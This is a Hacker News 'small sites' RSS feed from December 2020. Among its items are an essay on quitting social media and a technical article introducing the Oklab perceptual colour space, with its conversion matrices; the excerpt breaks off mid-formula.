<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 25 Dec 2020 17:02:27 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Fri, 25 Dec 2020 17:02:27 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Plantin-Moretus Museum online collection of 14,000 woodcuts in high resolution]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25526729">thread link</a>) | @simonpure
<br/>
December 24, 2020 | https://collectie.antwerpen.be/impressedbyplantin/all-woodcuts | <a href="https://web.archive.org/web/*/https://collectie.antwerpen.be/impressedbyplantin/all-woodcuts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://collectie.antwerpen.be/impressedbyplantin/all-woodcuts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25526729</guid>
            <pubDate>Thu, 24 Dec 2020 11:48:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Run for Free Xbox]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25526714">thread link</a>) | @derdeat
<br/>
December 24, 2020 | https://www.sotwe.com/tweet/1341973662866485248 | <a href="https://web.archive.org/web/*/https://www.sotwe.com/tweet/1341973662866485248">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.sotwe.com/tweet/1341973662866485248</link>
            <guid isPermaLink="false">hacker-news-small-sites-25526714</guid>
            <pubDate>Thu, 24 Dec 2020 11:46:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Social Media Considered Harmful]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25526518">thread link</a>) | @wslh
<br/>
December 24, 2020 | https://maraoz.com/2020/12/23/bye-social-media/ | <a href="https://web.archive.org/web/*/https://maraoz.com/2020/12/23/bye-social-media/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  

  <article>
    <p><img src="https://maraoz.com/img/bye-social-media/cover.jpg"></p>

<p><span>N</span>ot long ago, we lived in small hunter-gatherer tribes. Social skills evolved along our abilities to use physical tools and language. We spent our days hunting or foraging our food, and had plenty of free time to ponder life. Our survival was dependent upon our social skills. We were rewarded (by the fruits of cooperation) for having friends and social support, and killed (mostly by hunger or predators) if we were antisocial. Our brains developed to be very sensitive to social interactions. The ability to read other’s emotions, give them importance, and respond to them is a part of our hard-wired social brain. It also takes a lot of mental energy.</p>

<p>In the early days of social media, I was (as is usual with me) an avid promoter and ethusiast. Social media is just <em>amazing</em> for so many things: exploring ideas, being up to date with many topics, connecting with tons of people. Social media helped me bootstrap my professional life, and meet some of the most amazing people. However, I’ve now come to believe that in a couple of years, most people will view using social media as unhealthy, like we do today with smoking. We might need to find better ways to get these benefits withtout the costs.</p>

<p>I stopped using Facebook ~3 years ago, and Instagram ~2 years ago. My online life has been much better since. My offline life too. Today (actually,&nbsp;a month ago), I left Twitter. The costs are simply too high for me. I noticed the less I use any of those apps, the calmer my mind, the more I read, and the more time I spend outside, in real contact with other people and nature. These are things I value more than instant access to news and daily contact with thousands of people at this time.</p>

<p>It is very hard to argue that social media is not harmful for most. We are simply not made to continually know what everyone else is doing or thinking, all the time! And it’s not a neutral tech. It is actively addictive and destructive to our volition. Most of the people I’ve talked to say they’d like to use these apps less. Yet somehow they don’t. Our brains are wired to pay attention to each other and to care about what others think about us. Social media is designed to exploit both these things. It is engineered to hook us in, and to influence our behavior. That’s the product Facebook, Instagram and Twitter sell to their customers: changing your ideas and behavior. And they got some pretty talented people working on that.</p>

<p>I don’t really think I can convince anyone to leave social media. I don’t even think it’s bad for everyone or that the benefits can’t outweigh the costs for some. I’m writing this post because many of you will already be close to leaving one of these apps. You’ve been thinking about it already. You’ve already made up your mind about it, and you’re waiting for the right moment. If just one person makes the final step into at least <em>trying</em> to live without social media, I’ll be happy.&nbsp;It has made a huge change for me. If you think this is stupid or I don’t understand the beauty of the Internet, I think you’ll change your mind in a few years. Or social media will ;)</p>

<p>If you do leave social media, feel free to contact me after a couple of months to share experiences. It’s been amazing for me, and I’m not going back. I’m really interested in knowing more about how this change can affect other people’s life. I’m also curious to find new ways to stay in touch with people outside my local community which are less toxic to my mind.</p>

<p>To close this brief post, I’ll share a bold prediction (and hope) on this topic: Facebook, Instagram, and Twitter will have less monthly active users in 2025 than today (~2.6 billion, ~1 billion, ~330 million, respectively). I added this to my <a href="https://maraoz.com/2016/03/20/2026/">predictions for 2026 post</a>.</p>

<h3 id="additional-resources-and-learning">Additional Resources and Learning</h3>
<ul>
  <li><a href="https://www.ted.com/talks/cal_newport_why_you_should_quit_social_media?language=en">Cal Newport’s talk on “Why you should quit social media”</a>. Watching this was the first time I seriously considered quitting it forever.</li>
  <li><a href="https://www.imdb.com/title/tt11464826/">The Social Dilemma documentary</a>. Available on Netflix.</li>
  <li><a href="https://www.imdb.com/title/tt5962210/">Ingrid Goes West movie</a>. Thanks Vera!</li>
  <li><a href="https://www.youtube.com/watch?v=Czg_9C7gw0o">“Is Social Media Hurting Your Mental Health?” talk by Bailey Parnell</a>.</li>
  <li><a href="https://www.imdb.com/title/tt5497778/">Black Mirror’s “Nosedive” episode</a>.</li>
  <li><a href="https://www.youtube.com/watch?v=gM3KIvZO5oU">“What I learned from my social media fast” talk by Amber Quinney</a>.</li>
  <li><a href="https://www.youtube.com/watch?v=pOchBnZJdEk">“Live in the Moment: Delete Social Media” talk by Ryan Thomas</a></li>
</ul>

<h3 id="acknowledgements">Acknowledgements</h3>

<p><span>Cover photo by <a href="https://unsplash.com/@milo_contreras?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Camilo Contreras</a> on <a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></span></p>

<h3 id="comments-and-discussion">Comments and Discussion</h3>
<p><a href="https://news.ycombinator.com/item?id=25524429">Discuss on HN</a> - <a href="https://www.reddit.com/r/simpleliving/comments/kj6j15/social_media_considered_harmful/">Discuss on Reddit</a> - <a href="https://maraoz.com/cdn-cgi/l/email-protection#7b19021e56081418121a1756161e1f121a3b161a091a140155181416">Email a private comment</a></p>

  </article>
  

</div>

      </div>
    </div></div>]]>
            </description>
            <link>https://maraoz.com/2020/12/23/bye-social-media/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25526518</guid>
            <pubDate>Thu, 24 Dec 2020 10:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Efficient IO with io_uring [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25525792">thread link</a>) | @hannofcart
<br/>
December 23, 2020 | https://kernel.dk/io_uring.pdf | <a href="https://web.archive.org/web/*/https://kernel.dk/io_uring.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://kernel.dk/io_uring.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25525792</guid>
            <pubDate>Thu, 24 Dec 2020 07:53:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I'm Losing Trust in the Institutions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25525745">thread link</a>) | @remarkEon
<br/>
December 23, 2020 | https://www.persuasion.community/people/537979-yascha-mounk | <a href="https://web.archive.org/web/*/https://www.persuasion.community/people/537979-yascha-mounk">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Yascha Mounk</p><p>Founder and Editor-in-Chief</p></div></div>]]>
            </description>
            <link>https://www.persuasion.community/people/537979-yascha-mounk</link>
            <guid isPermaLink="false">hacker-news-small-sites-25525745</guid>
            <pubDate>Thu, 24 Dec 2020 07:38:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A perceptual color space for image processing]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25525726">thread link</a>) | @ingve
<br/>
December 23, 2020 | https://bottosson.github.io/posts/oklab/ | <a href="https://web.archive.org/web/*/https://bottosson.github.io/posts/oklab/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p>A perceptual color space is desirable when doing many kinds of image processing. It is useful for things like:</p><ul><li>Turning an image grayscale, while keeping the perceived lightness the same</li><li>Increasing the saturation of colors, while maintaining perceived hue and lightness</li><li>Creating smooth and uniform looking transitions between colors</li></ul><p>Unfortunately, as far as I am aware, while there are color spaces that aim to be perceptually uniform, none are without significant drawbacks when used for image processing.</p><p>For this reason I have designed a new perceptual color space, designed to be simple to use, while doing a good job at predicting perceived lightness, <a href="https://en.wikipedia.org/wiki/Colorfulness">chroma</a> and hue. It is called the <strong>Oklab color space</strong>, because it is an OK Lab color space.</p><p>Before diving into the details of why a new color space is needed and how it was derived, here is the everything needed to use the color space:</p><p>A color in Oklab is represented with three coordinates, similar to how <a href="https://en.wikipedia.org/wiki/CIELAB_color_space">CIELAB</a> works, but with better perceptual properties. Oklab uses a D65 whitepoint, since this is what sRGB and other common color spaces use. The three coordinates are:</p><ul><li><span><span><math><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></span> – perceived lightness</li><li><span><span><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span></span> – how green/red the color is</li><li><span><span><math><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span></span> – how blue/yellow the color is</li></ul><p>For many operations, <span><span><math><semantics><mrow><mi>L</mi><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">Lab</annotation></semantics></math></span></span>-coordinates can be used directly, but they can also be transformed into polar form, with the coordinates lightness, chroma and hue, <span><span><math><semantics><mrow><mi>L</mi><mi>C</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">LCh</annotation></semantics></math></span></span>:</p><p><span><span><span><math><semantics><mrow><mi>C</mi><mo>=</mo><mrow><msqrt><mrow><msup><mi>a</mi><mn>2</mn></msup><mo>+</mo><msup><mi>b</mi><mn>2</mn></msup></mrow></msqrt></mrow><mo separator="true">,</mo><mspace width="2em"></mspace><msup><mi>h</mi><mrow><mo>∘</mo></mrow></msup><mo>=</mo><mtext><mi mathvariant="normal">a</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">n</mi><mn>2</mn></mtext><mo>(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">C={\sqrt {a^2+b^2}}, \qquad h^{\circ}=\text{atan2}(a,b)</annotation></semantics></math></span></span></span></p><p>From <span><span><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><msup><mi>h</mi><mrow><mo>∘</mo></mrow></msup></mrow><annotation encoding="application/x-tex">h^{\circ}</annotation></semantics></math></span></span>, <span><span><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span></span> can be computed like this:</p><p><span><span><span><math><semantics><mrow><mi>a</mi><mo>=</mo><mi>C</mi><mi>cos</mi><mo>(</mo><msup><mi>h</mi><mrow><mo>∘</mo></mrow></msup><mo>)</mo><mo separator="true">,</mo><mspace width="2em"></mspace><mi>b</mi><mo>=</mo><mi>C</mi><mi>sin</mi><mo>(</mo><msup><mi>h</mi><mrow><mo>∘</mo></mrow></msup><mo>)</mo></mrow><annotation encoding="application/x-tex">a=C\cos(h^{\circ}),\qquad b=C\sin(h^{\circ})</annotation></semantics></math></span></span></span></p><p>Lets look at a practical example to see how Oklab performs, before looking at how the <span><span><math><semantics><mrow><mi>L</mi><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">Lab</annotation></semantics></math></span></span> coordinates are computed.</p><blockquote><h4 id="comparing-oklab-to-hsv">Comparing Oklab to HSV <a href="#comparing-oklab-to-hsv"><span><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 512 512" version="1.1" xml:space="preserve" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M459.654,233.373l-90.531,90.5c-49.969,50-131.031,50-181,0c-7.875-7.844-14.031-16.688-19.438-25.813  l42.063-42.063c2-2.016,4.469-3.172,6.828-4.531c2.906,9.938,7.984,19.344,15.797,27.156c24.953,24.969,65.563,24.938,90.5,0  l90.5-90.5c24.969-24.969,24.969-65.563,0-90.516c-24.938-24.953-65.531-24.953-90.5,0l-32.188,32.219  c-26.109-10.172-54.25-12.906-81.641-8.891l68.578-68.578c50-49.984,131.031-49.984,181.031,0  C509.623,102.342,509.623,183.389,459.654,233.373z M220.326,382.186l-32.203,32.219c-24.953,24.938-65.563,24.938-90.516,0  c-24.953-24.969-24.953-65.563,0-90.531l90.516-90.5c24.969-24.969,65.547-24.969,90.5,0c7.797,7.797,12.875,17.203,15.813,27.125  c2.375-1.375,4.813-2.5,6.813-4.5l42.063-42.047c-5.375-9.156-11.563-17.969-19.438-25.828c-49.969-49.984-131.031-49.984-181.016,0  l-90.5,90.5c-49.984,50-49.984,131.031,0,181.031c49.984,49.969,131.031,49.969,181.016,0l68.594-68.594  C274.561,395.092,246.42,392.342,220.326,382.186z"></path></svg><span></span></span></a></h4><p>Here’s an Oklab color gradient with varying hue and constant lightness and chroma.</p><p><img alt="Oklab varying hue plot" decoding="async" height="169" loading="lazy" src="https://bottosson.github.io/img/oklab/hue_oklab.png" width="1130"></p><p>Compare this to a similar plot of a HSV color gradient with varying hue and constant value and saturation (HSV using the sRGB color space).</p><p><img alt="HSV varying hue plot" decoding="async" height="169" loading="lazy" src="https://bottosson.github.io/img/oklab/hue_hsv.png" width="1130"></p><p>The gradient is quite uneven and there are clear differences in lightness for different hues. Yellow, magenta and cyan appear much lighter than red and blue.</p><p>Here is lightness of the HSV plot, as predicted by Oklab:</p><p><img alt="HSV varying hue plot lightness" decoding="async" height="169" loading="lazy" src="https://bottosson.github.io/img/oklab/hue_hsv_lightness.png" width="1130"></p></blockquote><h3 id="implementation">Implementation <a href="#implementation"><span><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 512 512" version="1.1" xml:space="preserve" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M459.654,233.373l-90.531,90.5c-49.969,50-131.031,50-181,0c-7.875-7.844-14.031-16.688-19.438-25.813  l42.063-42.063c2-2.016,4.469-3.172,6.828-4.531c2.906,9.938,7.984,19.344,15.797,27.156c24.953,24.969,65.563,24.938,90.5,0  l90.5-90.5c24.969-24.969,24.969-65.563,0-90.516c-24.938-24.953-65.531-24.953-90.5,0l-32.188,32.219  c-26.109-10.172-54.25-12.906-81.641-8.891l68.578-68.578c50-49.984,131.031-49.984,181.031,0  C509.623,102.342,509.623,183.389,459.654,233.373z M220.326,382.186l-32.203,32.219c-24.953,24.938-65.563,24.938-90.516,0  c-24.953-24.969-24.953-65.563,0-90.531l90.516-90.5c24.969-24.969,65.547-24.969,90.5,0c7.797,7.797,12.875,17.203,15.813,27.125  c2.375-1.375,4.813-2.5,6.813-4.5l42.063-42.047c-5.375-9.156-11.563-17.969-19.438-25.828c-49.969-49.984-131.031-49.984-181.016,0  l-90.5,90.5c-49.984,50-49.984,131.031,0,181.031c49.984,49.969,131.031,49.969,181.016,0l68.594-68.594  C274.561,395.092,246.42,392.342,220.326,382.186z"></path></svg><span></span></span></a></h3><h4 id="converting-from-xyz-to-oklab">Converting from XYZ to Oklab <a href="#converting-from-xyz-to-oklab"><span><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 512 512" version="1.1" xml:space="preserve" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M459.654,233.373l-90.531,90.5c-49.969,50-131.031,50-181,0c-7.875-7.844-14.031-16.688-19.438-25.813  l42.063-42.063c2-2.016,4.469-3.172,6.828-4.531c2.906,9.938,7.984,19.344,15.797,27.156c24.953,24.969,65.563,24.938,90.5,0  l90.5-90.5c24.969-24.969,24.969-65.563,0-90.516c-24.938-24.953-65.531-24.953-90.5,0l-32.188,32.219  c-26.109-10.172-54.25-12.906-81.641-8.891l68.578-68.578c50-49.984,131.031-49.984,181.031,0  C509.623,102.342,509.623,183.389,459.654,233.373z M220.326,382.186l-32.203,32.219c-24.953,24.938-65.563,24.938-90.516,0  c-24.953-24.969-24.953-65.563,0-90.531l90.516-90.5c24.969-24.969,65.547-24.969,90.5,0c7.797,7.797,12.875,17.203,15.813,27.125  c2.375-1.375,4.813-2.5,6.813-4.5l42.063-42.047c-5.375-9.156-11.563-17.969-19.438-25.828c-49.969-49.984-131.031-49.984-181.016,0  l-90.5,90.5c-49.984,50-49.984,131.031,0,181.031c49.984,49.969,131.031,49.969,181.016,0l68.594-68.594  C274.561,395.092,246.42,392.342,220.326,382.186z"></path></svg><span></span></span></a></h4><p>Given a color in <span><span><math><semantics><mrow><mi>X</mi><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">XYZ</annotation></semantics></math></span></span> coordinates, with a D65 whitepoint, Oklab coordinates can be computed like this:</p><p>First the <span><span><math><semantics><mrow><mi>X</mi><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">XYZ</annotation></semantics></math></span></span> coordinates are converted to an approximate cone responses:</p><p><span><span><span><math><semantics><mrow><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mi>l</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>m</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>s</mi></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">1</mn></msub></mrow><mo>×</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mi>X</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>Y</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>Z</mi></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{pmatrix} l \\ m \\ s \end{pmatrix} = \mathbf{M_1} \times \begin{pmatrix} X \\ Y \\ Z \end{pmatrix}</annotation></semantics></math></span></span></span></p><p>A non-linearity is applied:</p><p><span><span><span><math><semantics><mrow><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><msup><mi>l</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mi>m</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mi>s</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><msup><mi>l</mi><mrow><mfrac><mn>1</mn><mn>3</mn></mfrac></mrow></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mi>m</mi><mrow><mfrac><mn>1</mn><mn>3</mn></mfrac></mrow></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mi>s</mi><mrow><mfrac><mn>1</mn><mn>3</mn></mfrac></mrow></msup></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{pmatrix} l' \\ m' \\ s' \end{pmatrix} = \begin{pmatrix} l^{\frac 1 3} \\ m^{\frac 1 3} \\ s^{\frac 1 3} \end{pmatrix}</annotation></semantics></math></span></span></span></p><p>Finally, this is transformed into the <span><span><math><semantics><mrow><mi>L</mi><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">Lab</annotation></semantics></math></span></span>-coordinates:</p><p><span><span><span><math><semantics><mrow><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mi>L</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>a</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>b</mi></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">2</mn></msub></mrow><mo>×</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><msup><mi>l</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mi>m</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mi>s</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{pmatrix} L \\ a \\ b \end{pmatrix} = \mathbf{M_2} \times \begin{pmatrix} l' \\ m' \\ s' \end{pmatrix}</annotation></semantics></math></span></span></span></p><p>with the following values for <span><span><math><semantics><mrow><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">1</mn></msub></mrow></mrow><annotation encoding="application/x-tex">\mathbf{M_1}</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">2</mn></msub></mrow></mrow><annotation encoding="application/x-tex">\mathbf{M_2}</annotation></semantics></math></span></span>:</p><p><span><span><span><math><semantics><mrow><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">1</mn></msub></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>8</mn><mn>1</mn><mn>8</mn><mn>9</mn><mn>3</mn><mn>3</mn><mn>0</mn><mn>1</mn><mn>0</mn><mn>1</mn></mrow></mtd><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>3</mn><mn>6</mn><mn>1</mn><mn>8</mn><mn>6</mn><mn>6</mn><mn>7</mn><mn>4</mn><mn>2</mn><mn>4</mn></mrow></mtd><mtd><mrow><mo>−</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>1</mn><mn>2</mn><mn>8</mn><mn>8</mn><mn>5</mn><mn>9</mn><mn>7</mn><mn>1</mn><mn>3</mn><mn>7</mn></mrow></mtd></mtr><mtr><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>0</mn><mn>3</mn><mn>2</mn><mn>9</mn><mn>8</mn><mn>4</mn><mn>5</mn><mn>4</mn><mn>3</mn><mn>6</mn></mrow></mtd><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>9</mn><mn>2</mn><mn>9</mn><mn>3</mn><mn>1</mn><mn>1</mn><mn>8</mn><mn>7</mn><mn>1</mn><mn>5</mn></mrow></mtd><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>0</mn><mn>3</mn><mn>6</mn><mn>1</mn><mn>4</mn><mn>5</mn><mn>6</mn><mn>3</mn><mn>8</mn><mn>7</mn></mrow></mtd></mtr><mtr><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>0</mn><mn>4</mn><mn>8</mn><mn>2</mn><mn>0</mn><mn>0</mn><mn>3</mn><mn>0</mn><mn>1</mn><mn>8</mn></mrow></mtd><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>2</mn><mn>6</mn><mn>4</mn><mn>3</mn><mn>6</mn><mn>6</mn><mn>2</mn><mn>6</mn><mn>9</mn><mn>1</mn></mrow></mtd><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>6</mn><mn>3</mn><mn>3</mn><mn>8</mn><mn>5</mn><mn>1</mn><mn>7</mn><mn>0</mn><mn>7</mn><mn>0</mn></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{M_1} = \begin{pmatrix} +0.8189330101 &amp; +0.3618667424 &amp; -0.1288597137 \\ +0.0329845436 &amp; +0.9293118715 &amp; +0.0361456387 \\ +0.0482003018 &amp; +0.2643662691 &amp; +0.6338517070 \end{pmatrix}</annotation></semantics></math></span></span></span></p><p><span><span><span><math><semantics><mrow><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">2</mn></msub></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>2</mn><mn>1</mn><mn>0</mn><mn>4</mn><mn>5</mn><mn>4</mn><mn>2</mn><mn>5</mn><mn>5</mn><mn>3</mn></mrow></mtd><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>7</mn><mn>9</mn><mn>3</mn><mn>6</mn><mn>1</mn><mn>7</mn><mn>7</mn><mn>8</mn><mn>5</mn><mn>0</mn></mrow></mtd><mtd><mrow><mo>−</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>0</mn><mn>0</mn><mn>4</mn><mn>0</mn><mn>7</mn><mn>2</mn><mn>0</mn><mn>4</mn><mn>6</mn><mn>8</mn></mrow></mtd></mtr><mtr><mtd><mrow><mo>+</mo><mn>1</mn><mi mathvariant="normal">.</mi><mn>9</mn><mn>7</mn><mn>7</mn><mn>9</mn><mn>9</mn><mn>8</mn><mn>4</mn><mn>9</mn><mn>5</mn><mn>1</mn></mrow></mtd><mtd><mrow><mo>−</mo><mn>2</mn><mi mathvariant="normal">.</mi><mn>4</mn><mn>2</mn><mn>8</mn><mn>5</mn><mn>9</mn><mn>2</mn><mn>2</mn><mn>0</mn><mn>5</mn><mn>0</mn></mrow></mtd><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>4</mn><mn>5</mn><mn>0</mn><mn>5</mn><mn>9</mn><mn>3</mn><mn>7</mn><mn>0</mn><mn>9</mn><mn>9</mn></mrow></mtd></mtr><mtr><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>0</mn><mn>2</mn><mn>5</mn><mn>9</mn><mn>0</mn><mn>4</mn><mn>0</mn><mn>3</mn><mn>7</mn><mn>1</mn></mrow></mtd><mtd><mrow><mo>+</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>7</mn><mn>8</mn><mn>2</mn><mn>7</mn><mn>7</mn><mn>1</mn><mn>7</mn><mn>6</mn><mn>6</mn><mn>2</mn></mrow></mtd><mtd><mrow><mo>−</mo><mn>0</mn><mi mathvariant="normal">.</mi><mn>8</mn><mn>0</mn><mn>8</mn><mn>6</mn><mn>7</mn><mn>5</mn><mn>7</mn><mn>6</mn><mn>6</mn><mn>0</mn></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{M_2} = \begin{pmatrix} +0.2104542553 &amp; +0.7936177850 &amp; -0.0040720468 \\ +1.9779984951 &amp; -2.4285922050 &amp; +0.4505937099 \\ +0.0259040371 &amp; +0.7827717662 &amp; -0.8086757660 \end{pmatrix}</annotation></semantics></math></span></span></span></p><p>The inverse operation, going from Oklab to XYZ is done with the following steps:</p><p><span><span><span><math><semantics><mrow><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><msup><mi>l</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mi>m</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mi>s</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><msup><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">2</mn></msub></mrow><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>×</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mi>L</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>a</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>b</mi></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mspace width="2em"></mspace><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mi>l</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>m</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>s</mi></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><msup><mrow><mo>(</mo><msup><mi>l</mi><mrow><mi 